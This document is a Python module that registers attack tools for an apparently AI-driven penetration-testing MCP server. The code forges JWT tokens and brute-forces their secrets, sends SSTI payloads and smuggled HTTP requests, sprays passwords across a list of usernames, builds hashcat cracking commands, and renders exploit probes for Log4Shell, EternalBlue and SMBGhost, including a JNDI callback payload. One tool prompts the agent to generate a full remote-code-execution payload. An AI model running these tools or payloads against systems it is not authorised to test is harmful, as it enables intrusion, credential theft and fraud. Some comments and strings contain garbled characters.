"""Attack Modules MCP tool registration."""

from __future__ import annotations

import hashlib

from tools.mcp_tools.registry import *

# Strong references to background campaign tasks. CPython's event loop holds
# only a weak ref to a task, so an unreferenced asyncio.create_task() can be
# garbage-collected mid-run and the campaign's final/error state.json is never
# written (leaving it permanently "running"). The done-callback drops the ref
# once the task finishes so completed campaigns don't leak.
_running_campaign_tasks: set = set()

# campaign_id -> live AutonomousOrchestrator, so stop_campaign can signal a
# graceful stop. Popped when the background task finishes (see the done
# callback in start_autonomous_campaign).
_campaign_orchestrators: dict[str, Any] = {}


def _identify_hash_modes(h: str) -> list[tuple[str, str, str]]:
    """Return ``[(name, hashcat_mode, sample_cmd), ...]`` for a hash string.

    Single source of truth for the hash-type -> hashcat-mode mapping, shared by
    ``hash_crack_identify`` (advisory command suggestions) and the standalone
    ``run_hash_crack`` MCP tool (execution). Order matters: a 32-hex hash is
    reported as BOTH NTLM and MD5 (they are format-indistinguishable; the
    operator/LLM picks based on context -- NTLM from SMB, MD5 from a web app).
    """
    identifications: list[tuple[str, str, str]] = []

    # NTLM: 32 hex chars
    if re.fullmatch(r"[0-9a-fA-F]{32}", h):
        identifications.append(("NTLM", "1000", f"hashcat -m 1000 -a 3 '{h}' ?l?l?l?l?l?l?l?l"))

    # NetNTLMv2: user::domain:challenge:HMAC-MD5:blob
    if "::" in h and ":" in h:
        parts = h.split(":")
        if len(parts) >= 5:
            identifications.append(("NetNTLMv2", "5600", f"hashcat -m 5600 -a 0 '{h}' rockyou.txt"))

    # Kerberos TGS: $krb5tgs$23$*... (etype 23 RC4) / $krb5tgs$18$*... (etype 18 AES)
    if h.startswith("$krb5tgs$18$"):
        identifications.append(("Kerberos 5 TGS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt"))
    elif h.startswith("$krb5tgs$"):
        identifications.append(("Kerberos 5 TGS-REP", "13100", f"hashcat -m 13100 -a 0 '{h}' rockyou.txt"))

    # Kerberos AS-REP: $krb5asrep$23$*... (etype 23) / $krb5asrep$18$*... (etype 18)
    if h.startswith("$krb5asrep$18$"):
        identifications.append(("Kerberos 5 AS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt"))
    elif h.startswith("$krb5asrep$"):
        identifications.append(("Kerberos 5 AS-REP", "18200", f"hashcat -m 18200 -a 0 '{h}' rockyou.txt"))

    # MD5: 32 hex chars (always reported alongside NTLM -- format-ambiguous)
    if re.fullmatch(r"[0-9a-fA-F]{32}", h):
        identifications.append(("MD5 (also possible)", "0", f"hashcat -m 0 -a 0 '{h}' rockyou.txt"))

    # SHA1: 40 hex chars
    if re.fullmatch(r"[0-9a-fA-F]{40}", h):
        identifications.append(("SHA1", "100", f"hashcat -m 100 -a 0 '{h}' rockyou.txt"))

    # SHA256: 64 hex chars
    if re.fullmatch(r"[0-9a-fA-F]{64}", h):
        identifications.append(("SHA2-256", "1400", f"hashcat -m 1400 -a 0 '{h}' rockyou.txt"))

    # SHA512: 128 hex chars
    if re.fullmatch(r"[0-9a-fA-F]{128}", h):
        identifications.append(("SHA2-512", "1700", f"hashcat -m 1700 -a 0 '{h}' rockyou.txt"))

    # bcrypt: $2a$ / $2b$ / $2y$ / $2$ / $2x$
    if any(h.startswith(p) for p in ("$2a$", "$2b$", "$2y$", "$2$", "$2x$")):
        identifications.append(("bcrypt", "3200", f"hashcat -m 3200 -a 0 '{h}' rockyou.txt"))

    # sha512crypt: $6$...$...
    if h.startswith("$6$") and h.count("$") >= 3:
        identifications.append(("sha512crypt", "1800", f"hashcat -m 1800 -a 0 '{h}' rockyou.txt"))

    # md5crypt: $1$...$... (also catches Cisco type 5)
    if h.startswith("$1$") and h.count("$") >= 3:
        identifications.append(("md5crypt / Cisco type 5", "500", f"hashcat -m 500 -a 0 '{h}' rockyou.txt"))

    # Cisco type 9 (scrypt): $9$...
    if h.startswith("$9$"):
        identifications.append(("Cisco type 9 (scrypt)", "22321", f"hashcat -m 22321 -a 0 '{h}' rockyou.txt"))

    # Cisco type 4 (PBKDF2-SHA256): $4$...
    if h.startswith("$4$"):
        identifications.append(("Cisco type 4 (PBKDF2-SHA256)", "2400", f"hashcat -m 2400 -a 0 '{h}' rockyou.txt"))

    # MSSQL 2005: 0x0100...
    if h.lower().startswith("0x0100") and len(h) >= 54:
        identifications.append(("MSSQL 2005", "132", f"hashcat -m 132 -a 0 '{h}' rockyou.txt"))

    # MSSQL 2012/2014: 0x0200...
    if h.lower().startswith("0x0200") and len(h) >= 70:
        identifications.append(("MSSQL 2012/2014", "1731", f"hashcat -m 1731 -a 0 '{h}' rockyou.txt"))

    # Argon2: $argon2i$ / $argon2id$ (not in hashcat -- john only)
    if h.startswith("$argon2"):
        identifications.append(("Argon2", "N/A", f"john --format=argon2 '{h}'"))

    # scrypt: $scrypt$... or SCRYPT:...
    if h.startswith("$scrypt$") or h.startswith("SCRYPT:"):
        identifications.append(("scrypt", "8900", f"hashcat -m 8900 -a 0 '{h}' rockyou.txt"))

    # Django PBKDF2: pbkdf2_sha256$...
    if h.startswith("pbkdf2_sha256$") or h.startswith("pbkdf2_sha1$"):
        identifications.append(("Django PBKDF2", "12100", f"hashcat -m 12100 -a 0 '{h}' rockyou.txt"))

    # PDF: $pdf$...
    if h.startswith("$pdf$"):
        identifications.append(("PDF", "10400", f"hashcat -m 10400 -a 0 '{h}' rockyou.txt  # 10600/10700 for newer revisions"))

    # MS Office: $office$...
    if h.startswith("$office$"):
        identifications.append(("MS Office", "9400", f"hashcat -m 9400 -a 0 '{h}' rockyou.txt  # 9500/9600 for 2010/2013"))

    # WPA-PBKDF2 (possible): 64-hex:SSID
    if ":" in h and len(h.split(":")[0]) == 64 and len(h.split(":")[1]) <= 32:
        identifications.append(("WPA-PBKDF2 (possible)", "22000", f"hashcat -m 22000 -a 0 '{h}' rockyou.txt"))

    # LM: 16 bytes hex -- only when nothing else matched (a 16-hex fragment
    # of a longer hash must not false-positive as LM)
    if re.fullmatch(r"[0-9a-fA-F]{16}", h) and not identifications:
        identifications.append(("LM", "3000", f"hashcat -m 3000 -a 3 '{h}' ?u?u?u?u?u?u?u"))

    return identifications


def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
    workspace = ctx.workspace
    config = ctx.config
    search = ctx.search
    nvd = ctx.nvd
    researcher = ctx.researcher
    audit_tool = ctx.audit_tool
    require_allowlist = ctx.require_allowlist

    @mcp.tool()
    @require_allowlist()
    def jwt_tamper(target_ip: str, jwt_token: str = "") -> str:
        """Test JWT tokens for algorithm confusion (alg:none), HMAC key confusion, and weak secret brute-force. Provide a JWT token or leave empty to auto-discover from common endpoints."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import base64 as _b64
        import hashlib as _hashlib
        import hmac as _hmac

        result_lines = [f"JWT_TAMPER_RESULTS: {target_ip}", ""]

        # If no token provided, try to discover one
        token = jwt_token.strip() if jwt_token else ""
        if not token:
            import socket as _sock
            # Phase 4: expanded discovery paths (Keycloak, WordPress, OAuth)
            for path in [
                "/api/auth/login", "/login", "/auth", "/api/token",
                "/api/v1/login", "/signin", "/oauth/token", "/api/me",
                "/api/session", "/api/auth/token", "/api/access-token",
                "/auth/realms/master/protocol/openid-connect/token",
                "/wp-json/jwt-auth/v1/token", "/.well-known/openid-configuration",
            ]:
                try:
                    with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                        s.settimeout(5)
                        s.connect((target_ip, 80))
                        s.sendall(f"GET {path} HTTP/1.0\r\nHost: {target_ip}\r\n\r\n".encode())
                        resp = s.recv(8192).decode(errors="replace")
                        match = re.search(r"[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}", resp)
                        if match:
                            token = match.group(0)
                            result_lines.append(f"Discovered JWT at {path}: {token[:60]}...")
                            break
                except Exception:
                    pass

        if not token:
            return "\n".join(result_lines) + "\nNo JWT token found. Provide one via jwt_token parameter."

        parts = token.split(".")
        if len(parts) != 3:
            return "\n".join(result_lines) + "\nInvalid JWT format (expected header.payload.signature)."

        def _b64url_decode(data: str) -> bytes:
            data = data.replace("-", "+").replace("_", "/")
            padding = 4 - len(data) % 4
            if padding != 4:
                data += "=" * padding
            return _b64.b64decode(data)

        def _b64url_encode(data: bytes) -> str:
            return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()

        try:
            header = json.loads(_b64url_decode(parts[0]))
            result_lines.append(f"Header: {json.dumps(header)}")
        except Exception:
            header = {}
            result_lines.append("Header: (could not decode)")

        # Test 1: alg:none
        result_lines.append("")
        result_lines.append("--- alg:none attack ---")
        none_header = dict(header)
        none_header["alg"] = "none"
        none_token = f"{_b64url_encode(json.dumps(none_header).encode())}.{parts[1]}."
        result_lines.append(f"None-alg token: {none_token[:80]}...")
        result_lines.append("To test: curl -H 'Authorization: Bearer " + none_token + f"' http://{target_ip}/api/me")

        # Test 2: Weak HMAC secrets
        result_lines.append("")
        result_lines.append("--- Weak HMAC secret brute-force ---")
        alg = header.get("alg", "")
        if alg.startswith("HS"):
            hash_name = alg.replace("HS", "sha")
            # Phase 4: expanded weak-secret list (rockyou-top / jwt-secrets style)
            secrets = [
                "secret", "key", "jwt_secret", "private_key", "changeme", "password",
                "123456", "admin", "secret_key", "jwt-secret", "token", "auth",
                "supersecret", "qwerty", "letmein", "welcome", "administrator",
                "api_secret", "flask-secret", "django-insecure-", "node", "nodejs",
                "express", "nextauth", "supabase", "firebase", "prod", "staging",
                "dev", "test", "12345678", "password123", "secret123", "changethis",
            ]
            found_secrets = []
            for secret in secrets:
                try:
                    sig = _b64url_encode(_hmac.new(
                        secret.encode(), f"{parts[0]}.{parts[1]}".encode(),
                        getattr(_hashlib, hash_name, _hashlib.sha256)
                    ).digest())
                    if sig == parts[2]:
                        found_secrets.append(secret)
                except Exception:
                    pass
            if found_secrets:
                result_lines.append(f"WEAK SECRET FOUND: {found_secrets}")
            else:
                result_lines.append("No weak secrets found from common list.")
        else:
            result_lines.append(f"Algorithm is {alg}, not HMAC-based. Try HMAC-to-RSA confusion if alg starts with RS.")

        # Test 3: HMAC-to-RSA confusion
        if alg.startswith("RS"):
            result_lines.append("")
            result_lines.append("--- HMAC-to-RSA key confusion ---")
            result_lines.append("If RSA public key is exposed (/.well-known/jwks.json), change alg to HS256 and sign with the public key as HMAC secret.")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def ssti_probe(target_ip: str, port: int = 80) -> str:
        """Probe for Server-Side Template Injection (SSTI) across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines. Tests math payloads and reports which engine is detected."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock
        import urllib.parse as _urlparse

        result_lines = [f"SSTI_PROBE_RESULTS: {target_ip}:{port}", ""]

        math_payloads = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "Freemarker"),
            ("#{7*7}", "49", "Velocity"),
            ("<%= 7*7 %>", "49", "ERB/Ruby"),
            ("{{=7*7}}", "49", "Mako"),
            ("{7*7}", "49", "Smarty"),
            # Phase 4: additional engines + disambiguators
            ("<{7*7}>", "49", "StringTemplate"),
            ("{{7*'7'}}", "4977", "DotLiquid/Jinja2"),
            ("{% debug %}", "debug", "Pebble/Twig"),
            ("{{this.constructor.constructor('return 7')()}}", "7", "Handlebars"),
        ]

        endpoints = [
            "/", "/search", "/profile", "/user", "/page", "/render", "/preview",
            # Phase 4: template-render-heavy endpoints
            "/api/render", "/template", "/message", "/comment", "/email/preview",
            "/format", "/eval", "/compile", "/v1/render", "/admin/template",
        ]
        params = [
            "q", "search", "name", "username", "id", "page", "input", "data",
            # Phase 4: template/body params
            "template", "body", "content", "message", "text", "html",
            "subject", "recipient", "to", "from", "title",
        ]

        found_engine = None
        for ep in endpoints:
            for param in params:
                for payload, expected, engine in math_payloads:
                    try:
                        with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                            s.settimeout(5)
                            path = f"{ep}?{param}={_urlparse.quote(payload)}"
                            s.connect((target_ip, port))
                            s.sendall(f"GET {path} HTTP/1.0\r\nHost: {target_ip}\r\n\r\n".encode())
                            resp = s.recv(8192).decode(errors="replace")
                            if expected in resp:
                                result_lines.append(f"[DETECTED] {engine} at {ep}?{param}=<payload>")
                                result_lines.append(f"  Payload: {payload} -> reflected {expected}")
                                found_engine = engine
                                break
                    except Exception:
                        pass
                if found_engine:
                    break
            if found_engine:
                break

        if not found_engine:
            result_lines.append("No SSTI detected on common endpoints.")
        else:
            result_lines.append("")
            result_lines.append(f"Engine: {found_engine}")
            result_lines.append("Use write_python_file to generate a full RCE payload for this engine.")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def graphql_introspect(target_ip: str, port: int = 80) -> str:
        """Extract GraphQL schema via introspection query. Tests for query depth abuse, batching attacks, and alias-based resource exhaustion."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock

        result_lines = [f"GRAPHQL_INTROSPECT_RESULTS: {target_ip}:{port}", ""]

        intro_query = json.dumps({"query": """
            query { __schema { queryType { name } mutationType { name } types { name kind description fields { name } } } }
        """})

        endpoints = [
            "/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query",
            # Phase 4: expanded GraphQL surface
            "/api/v1/graphql", "/public/graphql", "/graphql/schema",
            "/api/schema", "/__graphql", "/api", "/graphql/batch", "/g",
        ]
        found = None

        for ep in endpoints:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(8)
                    s.connect((target_ip, port))
                    body = intro_query.encode()
                    req = (
                        f"POST {ep} HTTP/1.0\r\n"
                        f"Host: {target_ip}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(16384).decode(errors="replace")

                    if "__schema" in resp or "queryType" in resp:
                        found = ep
                        result_lines.append(f"[+] GraphQL endpoint found: {ep}")
                        result_lines.append("  Introspection ENABLED!")
                        # Extract type names
                        type_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', resp)
                        if type_matches:
                            result_lines.append(f"  Types exposed: {', '.join(type_matches[:20])}")
                        break
                    elif "graphql" in resp.lower() or "query" in resp.lower():
                        result_lines.append(f"[?] Possible GraphQL at {ep} (introspection may be disabled)")
            except Exception:
                pass

        if not found:
            result_lines.append("No GraphQL endpoint found with introspection enabled.")

        # Batching test
        if found:
            result_lines.append("")
            result_lines.append("--- Batching attack test ---")
            batch_body = json.dumps([
                {"query": "{ __typename }"},
                {"query": "{ __typename }"},
                {"query": "{ __typename }"},
                {"query": "{ __typename }"},
                {"query": "{ __typename }"},
            ]).encode()
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(8)
                s.connect((target_ip, port))
                req = (
                    f"POST {found} HTTP/1.0\r\n"
                    f"Host: {target_ip}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(batch_body)}\r\n"
                    f"\r\n"
                ).encode() + batch_body
                s.sendall(req)
                resp = s.recv(8192).decode(errors="replace")
                s.close()
                if resp.count("__typename") >= 5:
                    result_lines.append("[+] Batching ENABLED! Multiple queries processed in one request.")
                else:
                    result_lines.append("[-] Batching blocked or not supported.")
            except Exception:
                result_lines.append("Batching test failed.")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def race_request(target_ip: str, port: int = 80, endpoint: str = "/api/redeem", concurrent: int = 20) -> str:
        """Send N concurrent HTTP requests to exploit TOCTOU race conditions. Tests for coupon/limit bypass, double-spend, and rate-limit evasion. Use concurrent=20-100 for best results."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if concurrent < 2 or concurrent > 200:
            return "BLOCKED: concurrent must be between 2 and 200."

        import concurrent.futures as _cf
        import socket as _sock
        import threading as _thr

        result_lines = [f"RACE_REQUEST_RESULTS: {target_ip}:{port}{endpoint}", ""]
        result_lines.append(f"Concurrent requests: {concurrent}")

        results = {"success": 0, "failure": 0, "statuses": []}
        lock = _thr.Lock()

        def _send_one() -> dict:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(8)
                    s.connect((target_ip, port))
                    body = json.dumps({"code": "TEST100", "user": "attacker"}).encode()
                    req = (
                        f"POST {endpoint} HTTP/1.0\r\n"
                        f"Host: {target_ip}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(4096).decode(errors="replace")
                    status_line = resp.split("\r\n")[0] if resp else ""
                    with lock:
                        if "200" in status_line or "201" in status_line:
                            results["success"] += 1
                        else:
                            results["failure"] += 1
                        results["statuses"].append(status_line[:100])
                    return {"status": status_line[:100]}
            except Exception as e:
                with lock:
                    results["failure"] += 1
                return {"error": str(e)}

        start = time.monotonic()
        with _cf.ThreadPoolExecutor(max_workers=min(concurrent, 50)) as executor:
            futures = [executor.submit(_send_one) for _ in range(concurrent)]
            _cf.wait(futures, timeout=30)

        elapsed = time.monotonic() - start
        result_lines.append(f"Completed in {elapsed:.1f}s")
        result_lines.append(f"Success: {results['success']}, Failure: {results['failure']}")

        unique_statuses = set(s.split(" ")[1] if " " in s else s for s in results["statuses"] if s)
        if len(unique_statuses) > 1:
            result_lines.append(f"[!] Mixed status codes: {unique_statuses} Ã¢â‚¬â€ possible race condition!")
        if results["success"] > 1:
            result_lines.append(f"[!] {results['success']} requests succeeded Ã¢â‚¬â€ limit may be bypassed!")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def timing_oracle(target_ip: str, port: int = 80) -> str:
        """Detect timing side-channels in login, password reset, and token validation endpoints. Measures response time differences for user enumeration and blind data extraction."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock
        import statistics as _stats

        result_lines = [f"TIMING_ORACLE_RESULTS: {target_ip}:{port}", ""]

        def _measure(endpoint: str, body: str, samples: int = 8) -> list[float]:
            times = []
            for _ in range(samples):
                try:
                    with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                        s.settimeout(8)
                        s.connect((target_ip, port))
                        data = body.encode()
                        req = (
                            f"POST {endpoint} HTTP/1.0\r\n"
                            f"Host: {target_ip}\r\n"
                            f"Content-Type: application/json\r\n"
                            f"Content-Length: {len(data)}\r\n"
                            f"\r\n"
                        ).encode() + data
                        t0 = time.perf_counter()
                        s.sendall(req)
                        s.recv(4096)
                        elapsed = (time.perf_counter() - t0) * 1000
                        times.append(elapsed)
                except Exception:
                    pass
                time.sleep(0.15)
            return times

        # Test login timing
        result_lines.append("--- Login timing (valid vs invalid user) ---")
        valid_times = _measure("/api/login", json.dumps({"username": "admin", "password": "wrong"}))
        invalid_times = _measure("/api/login", json.dumps({"username": "noexist_xyz", "password": "test"}))

        if len(valid_times) >= 3 and len(invalid_times) >= 3:
            mv = _stats.mean(valid_times)
            mi = _stats.mean(invalid_times)
            diff = abs(mv - mi)
            result_lines.append(f"  Valid user mean: {mv:.1f}ms, Invalid: {mi:.1f}ms, Diff: {diff:.1f}ms")
            if diff > 50:
                result_lines.append("  [+] TIMING ORACLE DETECTED! User enumeration possible via timing.")
            else:
                result_lines.append("  [-] No significant timing difference.")
        else:
            result_lines.append("  Insufficient samples.")

        # Test password reset timing
        result_lines.append("--- Password reset timing ---")
        exist_times = _measure("/api/reset-password", json.dumps({"email": "admin@example.com"}))
        noexist_times = _measure("/api/reset-password", json.dumps({"email": "noexist@example.com"}))

        if len(exist_times) >= 3 and len(noexist_times) >= 3:
            me = _stats.mean(exist_times)
            mn = _stats.mean(noexist_times)
            diff = abs(me - mn)
            result_lines.append(f"  Exist mean: {me:.1f}ms, No-exist: {mn:.1f}ms, Diff: {diff:.1f}ms")
            if diff > 50:
                result_lines.append("  [+] TIMING ORACLE DETECTED! Email enumeration via password reset.")
            else:
                result_lines.append("  [-] No significant timing difference.")
        else:
            result_lines.append("  Insufficient samples.")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def request_smuggling_probe(target_ip: str, port: int = 80) -> str:
        """Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE). Can detect cache poisoning and request hijacking vulnerabilities."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock

        result_lines = [f"REQUEST_SMUGGLING_RESULTS: {target_ip}:{port}", ""]

        def _send_raw(payload: bytes) -> bytes:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(10)
                    s.connect((target_ip, port))
                    s.sendall(payload)
                    time.sleep(0.5)
                    resp = b""
                    try:
                        while True:
                            chunk = s.recv(4096)
                            if not chunk:
                                break
                            resp += chunk
                    except _sock.timeout:
                        pass
                    return resp
            except Exception as e:
                return f"ERROR: {e}".encode()

        # Baseline
        baseline = _send_raw(
            f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 0\r\n\r\n".encode()
        )
        result_lines.append(f"Baseline: {len(baseline)} bytes")

        # CL.TE test
        result_lines.append("")
        result_lines.append("--- CL.TE test ---")
        cl_te = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()
        resp = _send_raw(cl_te)
        result_lines.append(f"Response: {len(resp)} bytes")
        if abs(len(resp) - len(baseline)) > 200:
            result_lines.append("[!] Response differs from baseline Ã¢â‚¬â€ possible CL.TE smuggling!")

        # TE.CL test
        result_lines.append("")
        result_lines.append("--- TE.CL test ---")
        te_cl = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        resp = _send_raw(te_cl)
        text = resp.decode(errors="replace")
        result_lines.append(f"Response: {len(resp)} bytes")
        if "GPOST" in text or "Unrecognized method" in text:
            result_lines.append("[+] SMUGGLING CONFIRMED! Back-end saw smuggled 'GPOST' request!")

        # TE.TE test
        result_lines.append("")
        result_lines.append("--- TE.TE test (obfuscated TE header) ---")
        te_te = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Transfer-encoding: x\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        resp = _send_raw(te_te)
        text = resp.decode(errors="replace")
        result_lines.append(f"Response: {len(resp)} bytes")
        if "GPOST" in text:
            result_lines.append("[+] SMUGGLING CONFIRMED via TE.TE obfuscation!")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def password_spray(target_ip: str, port: int = 80, password: str = "Password1") -> str:
        """Spray one password across many common usernames. Low-and-slow to avoid account lockout. Use for initial access when you have no valid credentials."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock

        result_lines = [f"PASSWORD_SPRAY_RESULTS: {target_ip}:{port}", f"Password: {password}", ""]

        users = [
            "admin", "administrator", "root", "user", "test", "guest",
            "info", "support", "sales", "marketing", "hr", "finance",
            "manager", "developer", "dev", "ops", "backup", "service",
            # Phase 4: service accounts, cloud defaults, app defaults
            "sql", "oracle", "sa", "postgres", "redis", "mongo",
            "cassandra", "elastic", "kibana", "jenkins", "gitlab", "grafana",
            "jira", "confluence", "svc_account", "svc_web", "svc_db",
            "ec2-user", "ssm-user", "centos", "fedora", "ubuntu",
            "sysadmin", "operator", "audit", "security", "readonly",
            "reports", "backup_admin",
        ]

        found = []
        for username in users:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(8)
                    s.connect((target_ip, port))
                    body = json.dumps({"username": username, "password": password}).encode()
                    req = (
                        f"POST /api/login HTTP/1.0\r\n"
                        f"Host: {target_ip}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(4096).decode(errors="replace")

                    status_line = resp.split("\r\n")[0] if resp else ""
                    if "200" in status_line or "302" in status_line:
                        result_lines.append(f"  [+] {username}:{password} Ã¢â‚¬â€ SUCCESS ({status_line[:60]})")
                        found.append(username)
                    else:
                        result_lines.append(f"  [-] {username}:{password} Ã¢â‚¬â€ {status_line[:60]}")
            except Exception as e:
                result_lines.append(f"  [!] {username} Ã¢â‚¬â€ error: {e}")
            time.sleep(1.5)  # Delay to avoid lockout

        if found:
            result_lines.append(f"\n[+] {len(found)} valid credentials found: {found}")
        else:
            result_lines.append("\n[-] No valid credentials found with this password.")

        return "\n".join(result_lines)

    # Ã¢â€â‚¬Ã¢â€â‚¬ CVE-family exploit template renderers (Phase 0.5) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
    #
    # These are intentionally conservative templates Ã¢â‚¬â€ they produce
    # meaningful starting points that the LLM can refine, rather than a
    # one-size-fits-all HTTP probe. Each function returns a Python source
    # string ready to be embedded in the synthesize output.

    def _render_log4j_exploit(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (Log4Shell) probe for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# DETECTION ONLY Ã¢â‚¬â€ does NOT trigger code execution.
# Replace LDAP/HTTP callback host with your own (e.g. interactsh) when
# moving to a real engagement.
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else {port}
# Use a non-routable host by default; replace with your callback in real use.
CALLBACK_HOST = "example.invalid"
CALLBACK_PORT = 1389

PAYLOAD = "${{jndi:ldap://{{}}:{{}}/exploit}}".format(CALLBACK_HOST, CALLBACK_PORT)

def probe_http():
    s = socket.socket()
    s.settimeout(5)
    s.connect((TARGET, PORT))
    req = (
        f"GET / HTTP/1.0\\r\\n"
        f"Host: {{TARGET}}\\r\\n"
        f"User-Agent: {{PAYLOAD}}\\r\\n"
        f"X-Api-Version: {{PAYLOAD}}\\r\\n"
        f"\\r\\n"
    ).encode()
    s.sendall(req)
    print(s.recv(2048).decode(errors="replace")[:500])

if __name__ == "__main__":
    print(f"[*] Probing {{TARGET}}:{{PORT}} for Log4Shell")
    probe_http()
'''

    def _render_eternalblue_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (EternalBlue / SMBv1) DETECTION skeleton for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# Sends an SMBv1 negotiate request and reports the negotiated dialect.
# This is a probe Ã¢â‚¬â€ NOT a weaponized exploit.
import socket, sys, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 445

SMB_MAGIC = b"\\xfeSMB"
NEGOTIATE = b"\\x72\\x00\\x00\\x00\\x00"  # header placeholder

def negotiate():
    s = socket.socket()
    s.settimeout(8)
    s.connect((TARGET, PORT))
    # Real exploit: build full SMBv1 negotiate with NT LM 0.12 dialect.
    # This stub sends a minimal packet and reports any response.
    pkt = SMB_MAGIC + b"\\x00" * 32
    s.sendall(pkt)
    try:
        data = s.recv(1024)
        print(f"[+] Got {{len(data)}} bytes Ã¢â‚¬â€ SMB service is listening.")
        if SMB_MAGIC in data:
            print("[+] SMB magic present Ã¢â‚¬â€ SMBv1 may be enabled (vulnerable if unpatched).")
    except socket.timeout:
        print("[-] No response.")
    s.close()

if __name__ == "__main__":
    print(f"[*] Probing {{TARGET}}:{{PORT}} for EternalBlue (SMBv1)")
    negotiate()
'''

    def _render_smbghost_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
        return f'''# {cve} (SMBGhost) detection for {target_ip}
# Service: {svc} {ver}
# Auto-generated by CVE-to-Exploit Synthesizer
# Detects SMBv3.1.1 compression capability. If compression is enabled
# on a vulnerable build, the target is exposed.
import socket, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 445

def probe():
    s = socket.socket()
    s.settimeout(5)
    s.connect((TARGET, PORT))
    # Minimal SMBv3 negotiate; the relevant bit is the SMBv3.1.1 dialect
    # response with the COMPRESSION_CAPABILITIES flag (0x00000001) set.
    s.sendall(b"\\xfeSMB" + b"\\x00" * 60)
    try:
        resp = s.recv(1024)
        if b"\\x31\\x00" in resp[:20] or b"\\xfeSMB" in resp[:4]:
            print("[+] SMBv3.1.1 dialect visible Ã¢â‚¬â€ check if compression is enabled.")
        else:
            print("[-] No SMBv3.1.1 response.")
    except socket.timeout:
        print("[-] Timeout Ã¢â‚¬â€ service may be filtered.")
    s.close()

if __name__ == "__main__":
    print(f"[*] Probing {{TARGET}}:{{PORT}} for SMBGhost (CVE-2020-0796)")
    probe()
'''

